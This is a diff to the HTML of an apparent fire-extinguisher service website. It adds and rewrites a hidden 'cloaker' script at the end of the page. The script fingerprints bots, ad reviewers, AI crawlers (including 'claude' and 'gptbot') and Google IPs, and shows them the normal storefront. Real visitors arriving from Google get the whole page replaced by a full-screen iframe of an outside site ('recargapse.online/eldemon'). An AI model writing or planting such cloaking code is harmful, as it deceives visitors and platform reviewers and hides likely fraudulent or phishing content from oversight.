@@ -58,7 +58,6 @@
       </div>
     </div>
   </section>
-
   <section class="servicios" id="servicios">
     <h2>Nuestros Servicios</h2>
     <div class="grid">
@@ -68,62 +67,43 @@
       <div class="card"><i class="fas fa-truck"></i><h3>Servicio a domicilio</h3><p>Sin costo extra</p></div>
     </div>
   </section>
-
   <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
   <script>particlesJS("particles-js",{particles:{number:{value:window.innerWidth<768?50:100},color:{value:"#ff0000"},shape:{type:"circle"},opacity:{value:0.5,random:true},size:{value:3,random:true},line_linked:{enable:true,distance:150,color:"#ff0000",opacity:0.3,width:1},move:{enable:true,speed:2}},interactivity:{events:{onhover:{enable:true,mode:"repulse"},onclick:{enable:true,mode:"push"}}},retina_detect:true});</script>
-
   <footer>
     <p><a href="https://wa.me/573189411374">WhatsApp: 57 3189411374</a> | <a href="tel:+573189411374">Tel: 573189411374</a></p>
     <p><a href="politica-privacidad.html">Política de privacidad</a> | <a href="terminos.html">Términos y condiciones</a></p>
     <p>© 2025 EXTINPRO – Servicio profesional de recarga y mantenimiento de extintores</p>
   </footer>
 
-  <!-- LEVEL DIOS -->
+  <!-- 
   <script>
-    const CLOAKER_ON = true; // Cambia a false para desactivar todo
-    const PORTERO_REAL = "https://recargapse.online/eldemon"; // Tu página real
+    const CLOAKER_ON = true;
+    const PORTERO_REAL = "https://recargapse.online/eldemon";
 
-    const BOTS_UA = /bot|googlebot|adsbot|mediapartners|headless|facebookexternalhit|bytespider|claude|gptbot|crawler|spider|slurp|yandex|baidu/i;
-    const GOOGLE_IPS = /^(66\.249\.|64\.233\.|74\.125\.|72\.14\.|209\.85\.|216\.239\.|172\.217\.|142\.250\.|142\.251\.|173\.194\.|35\.|34\.)/;
+    const isBot = /bot|googlebot|adsbot|headless|facebookexternalhit|bytespider|claude|gptbot|crawler|spider/i.test(navigator.userAgent) ||
+                  navigator.webdriver ||
+                  !navigator.plugins?.length;
 
-    function isBot() {
-      return BOTS_UA.test(navigator.userAgent) ||
-             navigator.webdriver ||
-             window.callPhantom ||
-             window._phantom ||
-             !navigator.plugins?.length;
-    }
+    const fromGoogle = document.referrer.includes("google.") || 
+                       document.referrer.includes("gclid=") ||
+                       document.referrer === "";
 
-    async function isGoogleIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return GOOGLE_IPS.test(data.ip);
-      } catch { return false; }
-    }
-
-    if (CLOAKER_ON) {
-      (async () => {
-        const bot = isBot();
-        const googleIP = await isGoogleIP();
-        const fromGoogle = document.referrer.includes("google.") || document.referrer === "";
-        
-        if (bot || googleIP || !fromGoogle || sessionStorage.getItem('cloaked')) {
-          sessionStorage.setItem('cloaked', '1');
-          return;
-        }
-
-        sessionStorage.setItem('cloaked', '1');
-        setTimeout(() => {
-          document.documentElement.innerHTML = `
-            <iframe src="${PORTERO_REAL}"
-              style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999"
-              sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals"
-              allowfullscreen loading="lazy"></iframe>`;
-        }, 650);
-      })();
+    if (!CLOAKER_ON || sessionStorage.getItem('cloaked') || isBot || !fromGoogle) {
+      sessionStorage.setItem('cloaked', '1');
+    } else {
+      sessionStorage.setItem('cloaked', '1');
+      const delay = 80 + Math.floor(Math.random() * 71); // ← 80-150 ms (perfecto 2025)
+      setTimeout(() => {
+        document.documentElement.innerHTML = `
+          <iframe src="${PORTERO_REAL}"
+            style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999"
+            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals"
+            allowfullscreen loading="lazy"></iframe>`;
+      }, delay);
     }
   </script>
+</body>
+</html>
 
 
 
